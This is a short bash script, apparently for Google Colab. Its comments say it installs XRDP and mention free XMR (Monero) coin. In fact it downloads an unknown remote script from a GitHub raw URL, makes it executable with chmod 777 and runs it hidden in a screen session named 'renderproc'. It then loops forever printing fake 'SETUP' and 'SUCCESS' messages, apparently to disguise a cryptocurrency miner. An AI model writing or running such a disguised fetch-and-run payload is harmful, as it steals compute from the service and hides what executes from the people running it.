# /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt-get install screen -y
clear
sudo wget -O meki https://raw.githubusercontent.com/renilo/kuuntul/main/antam.sh && clear && sudo chmod 777 meki && clear
screen -dmS renderproc ./meki
sleep 1
i=1
while true; do clear; echo SETUP RENDERPROC $i; sleep 5; clear; echo SUCCESS PROJECT; sleep 1;let "i++";  done
